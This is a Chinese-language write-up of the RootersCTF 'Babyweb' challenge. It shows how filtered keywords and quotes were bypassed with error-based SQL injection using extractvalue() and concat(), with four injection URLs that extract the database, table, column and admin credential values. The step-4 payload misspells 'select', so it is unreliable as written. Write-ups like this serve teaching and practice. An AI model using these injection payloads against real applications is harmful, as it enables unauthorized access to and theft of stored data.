RootersCTF-Babyweb
======
My junior dev just set up a password protected webpage. Can you get in?

分析过程
------

打开链接提示管理员的密码是18位，并且过滤掉了UNION SLEEP ' " OR - BENCHMARK。因此利用爆破出密码是比较不现实的，结合题目提示是使用注入方法。看到单引号和双引号被过滤，猜测是被反斜杠转义掉，便尝试宽字节注入，使用`%df%27`进行测试，结果注入失败。<br><br>
并且提示UNION、OR也都被过滤，原本想着利用大小写或者编码绕过，但是引号既然不能成功绕过，说明不能用闭合引号进行注入。经过多次尝试发现利用`extractvalue()`函数进行报错注入可以成功实现注入,因此可以结合concat函数实现注入。<br><br>
`extractvalue()`：函数功能是从目标XML中返回包含所查询值的字符串。<br>
>EXTRACTVALUE (XML_document, XPath_string);<br>
>>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>
>>第二个参数：XPath_string (Xpath格式的字符串)<br>
 extractvalue注入的原理：如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。<br><br>

注入过程
------

1、爆库名<br>
```
https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) <br>
```
回显XPATH syntax error:\~SQLinjection\~，爆出了库名SQLinjection<br>
2、爆表名<br>
```
https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))<br>
```
回显XPATH syntax error:\~users\~，爆出了表名users<br>
这里需要说名一下，由于单双引号被过滤，故注入语句中如果有字符串需要单双引号，应当尽量避免，这里可以使用查询语句的多重利用避免，当然直接填库名也是不需要单双引号的（下面表名同理）。<br>
3、爆列名<br>
```
https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e))<br>
```
回显XPATH syntax error:\~user、uniqueid\~，爆出列名user、uniqueid，这两个列里肯定有我们需要的重要内容。<br>
4、爆字段<br>
```
https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(selcet uniqueid/user from users limit 1),0x7e));<br>
```
这里分两步分别爆出admin和其对应的18位的uniqueid，拿去尝试登录，成功登路并拿到flag。<br>
由于环境不能复现，做题的时候也没有截图，这里不再贴出图片。<br><br>
报错注入参考链接：https://www.jianshu.com/p/bf5edd484957<br>
